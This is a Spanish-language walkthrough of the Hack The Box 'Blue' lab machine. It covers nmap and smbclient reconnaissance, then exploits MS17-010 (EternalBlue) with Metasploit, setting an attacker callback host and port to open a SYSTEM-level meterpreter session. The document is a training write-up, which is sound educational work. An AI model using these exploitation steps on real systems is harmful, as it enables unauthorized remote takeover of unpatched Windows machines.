
---

----
![[e867f4569180c803c63776af56a69e3d.png]]

### 🧪 **Tarea 1 – ¿Cuántos puertos TCP abiertos hay en Blue? (sin contar puertos de 5 cifras)**

#### 🔍 Escaneo Nmap

Ejecutamos un escaneo con detección de versión y omitiendo ICMP (`-Pn`), sobre todos los puertos:

```bash
sudo nmap -sS -sV -Pn -p- 10.10.10.40
```

🧾 Resultado Relevante

![[c9253209c8e4d5cd7c40b802feb32346.png]]

📌 **Importante:** Solo nos interesan los puertos de 4 cifras o menos.

#### ✅ Respuesta:

> **3 puertos abiertos** (135, 139, 445)


### 💻 **Tarea 2 – ¿Cuál es el nombre del host de Blue?**

#### 🔍 Análisis del banner Nmap

En el resultado de `nmap`, encontramos:

```bash
Service Info: Host: HARIS-PC
```

📌 Este es el **nombre NetBIOS** del equipo, también conocido como **hostname**.

#### ✅ Respuesta:

> **haris-PC**


### 🪟 **Tarea 3 – ¿Qué sistema operativo corre la máquina?**

#### 🔍 Información del escaneo

Del mismo resultado:

```bash
445/tcp open  microsoft-ds Microsoft Windows 7 - 10
Service Info: OS: Windows
```

Y más arriba:

```bash
microsoft-ds (workgroup: WORKGROUP)
```

Nmap detecta que el puerto 445 está utilizando el servicio típico de **compartición de archivos de Windows**, y nos indica que la máquina corre un sistema **Windows 7 a 10**. En tareas posteriores (como las vulnerabilidades), confirmaremos que se trata de **Windows 7** concretamente.

#### ✅ Respuesta:

> **Windows 7**


🔚 **Conclusión parcial**

Ya tenemos una imagen clara del sistema:

- 🎯 IP: `10.10.10.40`
    
- 🖥️ Hostname: `haris-PC`
    
- 🧱 Sistema operativo: `Windows 7`
    
- 🔐 Servicios abiertos: `135`, `139`, `445` (MSRPC, NetBIOS y SMB)
    

Esto nos prepara para la siguiente fase: **reconocimiento profundo** sobre SMB y búsqueda de vulnerabilidades 🎯


## 📁 Tarea 4 – ¿Cuántos recursos compartidos SMB hay en Blue?

### 🔎 Comando utilizado

```bash
smbclient -L //10.10.10.40 -N
```

📌 La opción `-L` lista los recursos compartidos disponibles en el servidor SMB, y `-N` evita autenticación (sin usuario ni contraseña).

🧾 Resultado obtenido

![[a3cc3be042981892388b769877d28605.png]]

📍 Se listan **5 recursos compartidos SMB** en total:

1. `ADMIN$` → Share administrativa oculta
    
2. `C$` → Share oculta del disco principal
    
3. `IPC$` → Canal de comunicación (Inter-Process Communication)
    
4. `Share` → Carpeta compartida personalizada
    
5. `Users` → Carpeta de usuarios compartida
    

💡 **Nota**: Las que terminan en `$` son ocultas pero siguen contando como compartidas.


## 🛡️ Tarea 5 – ¿Qué boletín de seguridad de Microsoft de 2017 describe una vulnerabilidad RCE en SMB?

### 🕵️‍♂️ Análisis

Una de las vulnerabilidades más graves en SMBv1 fue descubierta en 2017 y explotada por el ransomware **WannaCry**. Esta vulnerabilidad afecta al servicio SMB que vimos corriendo en el puerto **445**.

### 🧠 Detalles de la vulnerabilidad

- 📌 **Identificador**: `MS17-010`
    
- 📅 Año: 2017
    
- 🎯 Afecta a: Windows 7 (entre otros)
    
- 🔥 Tipo: **Remote Code Execution (RCE)**
    
- 📂 Relacionado con: EternalBlue (exploit filtrado de la NSA)


![[ff6bbaea8942f71fab17703b2ec4fd4d.png]]

### 🧾 Enlace oficial:

- [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)

### 💥 Tarea 7 – ¿Con qué usuario se obtiene ejecución al explotar MS17-010?

### ⚙️ Herramienta utilizada: **Metasploit Framework**

1. **Inicializamos la base de datos** (opcional pero recomendado):

```bash
sudo msfdb run
```

![[753dd28631e6395cc85ac11ef996a43a.png]]

Esto lanza la base de datos de Metasploit y abre automáticamente la consola (`msfconsole`).


2 .**Buscamos el módulo relacionado con MS17-010**:

![[3132d0258817e939d09a002505166459.png]]

Entre los módulos encontrados, el más conocido es:

```bash
exploit/windows/smb/ms17_010_eternalblue
```

### 🛠️ Configuración del exploit

3. **Seleccionamos el módulo**:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

![[22eff44c097a48e25165bcd5decbfbc7.png]]

**Revisamos las opciones disponibles y establecemos los valores necesarios**:

```bash
set RHOSTS 10.10.10.40
set LHOST <tu IP tun0 o VPN>  # en tu caso fue 10.10.14.6
set LPORT 4444
```

![[0babd09996d4414f391561497fcae8fe.png]]

También puedes seleccionar el `target` si es necesario:

![[df634d28559f07ef56810ca397c84cce.png]]

### 🚀 Ejecución del exploit

6. **Lanzamos la explotación**:

![[b0bcf5688eeedd1683e083fedf5de804.png]]

En la salida se confirma:

- ✅ El objetivo es vulnerable
    
- ✅ Se ejecutó el payload
    
- ✅ Se abrió una sesión meterpreter correctamente


### 🧑‍💻 Comprobación del usuario

7. Una vez dentro de **meterpreter**, intentamos verificar el contexto del usuario:

```bash
shell
whoami
```

📌 Resultado:

```bash
nt authority\system
```

![[39c439a8244c0966d5e8e7c6b76a6202.png]]

 ✅ Esto confirma que el exploit nos da acceso con **privilegios máximos (SYSTEM)** en la máquina Windows.

---
### ✅ Respuesta:

> **nt authority\system**


Y a continuación, buscaremos las flags de user y admin:

### 🏁 Flags obtenidas

📍 Rutas:

![[7ed0f6be030bfad95dc3eea7f3b3e2f3.png]]

![[841570bddf74b866f2029ea36b3c2710.png]]

### 📌 Notas adicionales para Obsidian

- Este exploit aprovecha un **desbordamiento de memoria (buffer overflow)** en el servicio SMBv1.
    
- La vulnerabilidad fue utilizada por el ransomware WannaCry, NotPetya y otros.
    
- El control como `NT AUTHORITY\SYSTEM` permite ejecutar cualquier comando en la máquina con permisos de **root** (en Windows, SYSTEM es incluso más poderoso que Administrator en muchos contextos).


## ✅ Conclusión Final – Blue (HTB)

---

### 🧠 **Resumen del recorrido**

- 🔍 Se identificaron 3 puertos abiertos: `135`, `139` y `445`, todos relacionados con servicios SMB/RPC de Windows.
    
- 🖥️ El hostname revelado fue `haris-PC`, ejecutando **Windows 7 Professional**.
    
- 📁 Se detectaron 5 recursos compartidos por SMB, lo cual confirmó un entorno típico vulnerable.
    
- ⚠️ La máquina resultó vulnerable al infame boletín **MS17-010**, explotable mediante **EternalBlue**.
    

---

### 💣 **Impacto de la vulnerabilidad MS17-010**

- Esta es una de las vulnerabilidades más críticas de los últimos tiempos. Fue usada por malware como **WannaCry** o **NotPetya** y es capaz de comprometer sistemas **sin autenticación previa**.
    
- El exploit permite **ejecución remota de código** con privilegios **SYSTEM**, es decir, **control absoluto del sistema** 🛑.
    
- Este tipo de vulnerabilidad **destaca la importancia de los parches de seguridad**, especialmente en sistemas heredados como Windows 7.
    

---

### 🛠️ **Lo aprendido**

- Uso de `nmap` para detectar servicios relevantes.
    
- Exploración de recursos SMB con `smbclient`.
    
- Identificación de vulnerabilidades mediante fingerprinting de servicios.
    
- Uso práctico de **Metasploit Framework**:
    
    - Búsqueda de módulos (`search`)
        
    - Configuración (`set RHOSTS`, `LHOST`, `LPORT`)
        
    - Verificación de vulnerabilidad y explotación.
        
- Reconocimiento del contexto de privilegios tras explotación (`nt authority\system`).